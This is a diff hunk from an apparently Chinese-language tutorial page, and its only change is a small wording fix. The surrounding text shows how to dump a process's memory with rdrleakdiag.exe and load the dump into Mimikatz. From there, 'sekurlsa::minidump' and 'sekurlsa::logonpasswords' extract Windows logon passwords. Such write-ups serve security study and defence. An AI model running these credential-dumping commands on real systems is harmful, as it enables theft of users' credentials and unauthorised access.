@@ -31,7 +31,7 @@ rdrleakdiag.exe /p 548 /o C:\Users\Administrator\Desktop\ /fullmemdmp /wait 1
 ```
 ![](https://xxxeyj.github.io/images/20-09-15_THREE.PNG)
 
-可以看到桌面上已经生成了两个文件，将其 dmp 拷贝至 Mimikatz 目录下，而后使用 Mimikatz 载入 dmp 文件，使用如下两条命令即可；
+可以看到桌面上已经生成了两个文件，将其 dmp 文件拷贝至 Mimikatz 目录下，而后使用 Mimikatz 载入 dmp 文件，使用如下两条命令即可；
 ```mimikatz
 sekurlsa::minidump minidump_548.dmp
 sekurlsa::logonpasswords
